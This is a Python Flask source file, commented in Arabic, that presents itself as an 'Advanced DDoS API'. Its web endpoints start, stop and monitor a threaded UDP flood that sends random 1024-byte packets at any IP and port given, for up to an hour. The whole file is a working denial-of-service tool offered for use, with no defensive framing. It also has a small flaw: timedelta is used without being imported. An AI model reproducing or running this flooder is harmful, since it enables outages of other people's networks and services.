from flask import Flask, request, jsonify
from flask_cors import CORS
import socket
import random
import threading
import time
from datetime import datetime
import logging

app = Flask(__name__)
CORS(app)  # تفعيل CORS للجميع

# إعدادات السجل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# المتغيرات العالمية
attack_data = {
    'active': False,
    'target_ip': None,
    'target_port': None,
    'start_time': None,
    'packets_sent': 0,
    'attack_thread': None,
    'stop_flag': threading.Event()
}

# قفل للسلامة مع الخيوط
attack_lock = threading.Lock()

class UDPAttack:
    """فئة متقدمة لإدارة هجوم UDP"""
    
    def __init__(self, target_ip, target_port, packet_size=1024):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.packets_sent = 0
        self.running = False
        self.start_time = None
        
    def generate_packet(self):
        """إنشاء حزمة UDP عشوائية"""
        return random._urandom(self.packet_size)
    
    def attack(self, duration=60):
        """تنفيذ الهجوم لمدة محددة"""
        self.running = True
        self.start_time = datetime.now()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time and self.running:
                try:
                    packet = self.generate_packet()
                    sock.sendto(packet, (self.target_ip, self.target_port))
                    self.packets_sent += 1
                    
                    # تحديث البيانات العالمية
                    with attack_lock:
                        attack_data['packets_sent'] = self.packets_sent
                    
                    # تأخير بسيط للتحكم في معدل الإرسال
                    time.sleep(0.001)
                    
                except socket.error as e:
                    logger.error(f"خطأ في الإرسال: {e}")
                    break
                    
        finally:
            sock.close()
            self.running = False
            logger.info(f"تم إرسال {self.packets_sent} حزمة")

def udp_flood_worker(target_ip, target_port, duration):
    """دالة العمل لخيط الهجوم"""
    try:
        attack = UDPAttack(target_ip, target_port)
        attack.attack(duration)
    except Exception as e:
        logger.error(f"خطأ في هجوم UDP: {e}")
    finally:
        with attack_lock:
            attack_data['active'] = False
            attack_data['stop_flag'].clear()

@app.route('/')
def home():
    """الصفحة الرئيسية"""
    return jsonify({
        "status": "online",
        "service": "Advanced DDoS API",
        "version": "2.0",
        "endpoints": {
            "/attack/start": "بدء الهجوم (GET/POST)",
            "/attack/stop": "إيقاف الهجوم (GET/POST)",
            "/attack/status": "حالة الهجوم (GET)",
            "/attack/set_target": "تعيين هدف جديد (POST)"
        },
        "documentation": "استخدم /docs للوثائق الكاملة"
    })

@app.route('/docs')
def documentation():
    """صفحة الوثائق"""
    docs = {
        "API Endpoints": {
            "بدء الهجوم": {
                "URL": "/attack/start",
                "Method": "GET or POST",
                "Parameters": {
                    "ip": "عنوان IP الهدف (مطلوب)",
                    "port": "منفذ الهدف (مطلوب)",
                    "duration": "مدة الهجوم بالثواني (اختياري، افتراضي 60)"
                },
                "Example": "/attack/start?ip=192.168.1.100&port=80&duration=30"
            },
            "إيقاف الهجوم": {
                "URL": "/attack/stop",
                "Method": "GET or POST",
                "Description": "إيقاف أي هجوم نشط"
            },
            "حالة الهجوم": {
                "URL": "/attack/status",
                "Method": "GET",
                "Description": "الحصول على حالة الهجوم الحالي"
            },
            "تعيين هدف": {
                "URL": "/attack/set_target",
                "Method": "POST",
                "Parameters": {
                    "ip": "عنوان IP الهدف",
                    "port": "منفذ الهدف"
                }
            }
        },
        "Advanced Features": {
            "نوع الحزمة": "UDP Flood",
            "الحجم الافتراضي": "1024 بايت",
            "الخيوط": "يدعم الهجمات المتعددة",
            "التسجيل": "سجل مفصل للهجمات"
        }
    }
    return jsonify(docs)

@app.route('/attack/start', methods=['GET', 'POST'])
def start_attack():
    """بدء هجوم جديد"""
    global attack_data
    
    # الحصول على المعلمات
    if request.method == 'POST':
        data = request.json if request.is_json else request.form
        ip = data.get('ip', request.args.get('ip'))
        port = data.get('port', request.args.get('port'))
        duration = data.get('duration', request.args.get('duration', 60))
    else:
        ip = request.args.get('ip')
        port = request.args.get('port')
        duration = request.args.get('duration', 60)
    
    # التحقق من المدخلات
    if not ip or not port:
        return jsonify({
            "status": "error",
            "message": "الرجاء توفير IP و Port",
            "example": "/attack/start?ip=192.168.1.100&port=80&duration=30"
        }), 400
    
    try:
        port = int(port)
        duration = int(duration)
        
        if duration <= 0:
            return jsonify({
                "status": "error",
                "message": "المدة يجب أن تكون أكبر من صفر"
            }), 400
        
        if duration > 3600:  # حد أقصى ساعة واحدة
            duration = 3600
            
    except ValueError:
        return jsonify({
            "status": "error",
            "message": "Port و Duration يجب أن يكونا أرقاماً"
        }), 400
    
    # التحقق من وجود هجوم نشط
    with attack_lock:
        if attack_data['active']:
            return jsonify({
                "status": "error",
                "message": "يوجد هجوم نشط بالفعل",
                "current_target": f"{attack_data['target_ip']}:{attack_data['target_port']}"
            }), 409
        
        # تعيين البيانات الجديدة
        attack_data['active'] = True
        attack_data['target_ip'] = ip
        attack_data['target_port'] = port
        attack_data['start_time'] = datetime.now()
        attack_data['packets_sent'] = 0
        attack_data['stop_flag'].clear()
    
    # بدء الهجوم في خيط منفصل
    attack_thread = threading.Thread(
        target=udp_flood_worker,
        args=(ip, port, duration),
        daemon=True
    )
    
    with attack_lock:
        attack_data['attack_thread'] = attack_thread
    
    attack_thread.start()
    
    logger.info(f"بدأ الهجوم على {ip}:{port} لمدة {duration} ثانية")
    
    return jsonify({
        "status": "success",
        "message": "تم بدء الهجوم بنجاح",
        "attack_id": f"ATTACK_{int(time.time())}",
        "target": {
            "ip": ip,
            "port": port
        },
        "duration": f"{duration} ثانية",
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "estimated_end": (datetime.now() + timedelta(seconds=duration)).strftime("%Y-%m-%d %H:%M:%S"),
        "protocol": "UDP Flood",
        "packet_size": "1024 بايت"
    })

@app.route('/attack/stop', methods=['GET', 'POST'])
def stop_attack():
    """إيقاف الهجوم الحالي"""
    global attack_data
    
    with attack_lock:
        if not attack_data['active']:
            return jsonify({
                "status": "error",
                "message": "لا يوجد هجوم نشط لإيقافه"
            }), 404
        
        # تعيين العلم للإيقاف
        attack_data['stop_flag'].set()
        attack_data['active'] = False
        
        # جمع المعلومات
        target_info = f"{attack_data['target_ip']}:{attack_data['target_port']}"
        packets = attack_data['packets_sent']
        start_time = attack_data['start_time']
        
        # إعادة التعيين
        attack_data['target_ip'] = None
        attack_data['target_port'] = None
        attack_data['start_time'] = None
        attack_data['packets_sent'] = 0
    
    logger.info(f"تم إيقاف الهجوم على {target_info}")
    
    return jsonify({
        "status": "success",
        "message": "تم إيقاف الهجوم بنجاح",
        "previous_target": target_info,
        "packets_sent": packets,
        "attack_duration": str(datetime.now() - start_time) if start_time else "غير معروف"
    })

@app.route('/attack/status', methods=['GET'])
def attack_status():
    """الحصول على حالة الهجوم الحالي"""
    with attack_lock:
        if not attack_data['active']:
            return jsonify({
                "status": "inactive",
                "message": "لا يوجد هجوم نشط",
                "last_update": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        
        duration = datetime.now() - attack_data['start_time']
        
        return jsonify({
            "status": "active",
            "target": {
                "ip": attack_data['target_ip'],
                "port": attack_data['target_port']
            },
            "start_time": attack_data['start_time'].strftime("%Y-%m-%d %H:%M:%S"),
            "duration_seconds": duration.total_seconds(),
            "duration_human": str(duration),
            "packets_sent": attack_data['packets_sent'],
            "packets_per_second": attack_data['packets_sent'] / max(duration.total_seconds(), 1),
            "protocol": "UDP Flood",
            "estimated_bandwidth": f"{(attack_data['packets_sent'] * 1024) / (duration.total_seconds() * 1024 * 1024):.2f} MB/s"
        })

@app.route('/attack/set_target', methods=['POST'])
def set_target():
    """تعيين هدف جديد"""
    global attack_data
    
    data = request.json if request.is_json else request.form
    
    ip = data.get('ip')
    port = data.get('port')
    
    if not ip or not port:
        return jsonify({
            "status": "error",
            "message": "الرجاء توفير IP و Port"
        }), 400
    
    try:
        port = int(port)
    except ValueError:
        return jsonify({
            "status": "error",
            "message": "Port يجب أن يكون رقماً"
        }), 400
    
    with attack_lock:
        if attack_data['active']:
            return jsonify({
                "status": "warning",
                "message": "يوجد هجوم نشط، لا يمكن تغيير الهدف",
                "suggestion": "استخدم /attack/stop أولاً"
            }), 409
        
        attack_data['target_ip'] = ip
        attack_data['target_port'] = port
    
    logger.info(f"تم تعيين الهدف الجديد: {ip}:{port}")
    
    return jsonify({
        "status": "success",
        "message": "تم تعيين الهدف بنجاح",
        "target": f"{ip}:{port}",
        "next_step": "استخدم /attack/start لبدء الهجوم"
    })

@app.route('/attack/history', methods=['GET'])
def attack_history():
    """سجل الهجمات السابقة"""
    # في تطبيق حقيقي، يمكن حفظ هذا في قاعدة بيانات
    return jsonify({
        "status": "info",
        "message": "هذه الميزة قيد التطوير",
        "planned_features": [
            "حفظ سجل الهجمات",
            "إحصائيات مفصلة",
            "تصدير التقارير",
            "رسوم بيانية"
        ]
    })

@app.route('/health', methods=['GET'])
def health_check():
    """فحص صحة الخادم"""
    with attack_lock:
        active = attack_data['active']
        threads = threading.active_count()
    
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "attack_active": active,
        "active_threads": threads,
        "memory_usage": "N/A",
        "uptime": "N/A"
    })

@app.errorhandler(404)
def not_found(error):
    """معالجة الأخطاء 404"""
    return jsonify({
        "status": "error",
        "message": "الصفحة غير موجودة",
        "available_endpoints": [
            "/",
            "/docs",
            "/attack/start",
            "/attack/stop",
            "/attack/status",
            "/attack/set_target",
            "/health"
        ]
    }), 404

@app.errorhandler(500)
def internal_error(error):
    """معالجة الأخطاء 500"""
    logger.error(f"خطأ داخلي: {error}")
    return jsonify({
        "status": "error",
        "message": "حدث خطأ داخلي في الخادم",
        "error_code": "INTERNAL_SERVER_ERROR"
    }), 500

if __name__ == '__main__':
    # إعدادات الخادم
    host = '0.0.0.0'
    port = 5000
    
    print("=" * 50)
    print("🚀 تشغيل DDoS API المتقدم")
    print(f"🌐 العنوان: http://{host}:{port}")
    print("📚 الوثائق: http://localhost:5000/docs")
    print("⚡ الهجوم: UDP Flood")
    print("🔧 الوضع: تطوير")
    print("=" * 50)
    
    app.run(host=host, port=port, debug=True, threaded=True)
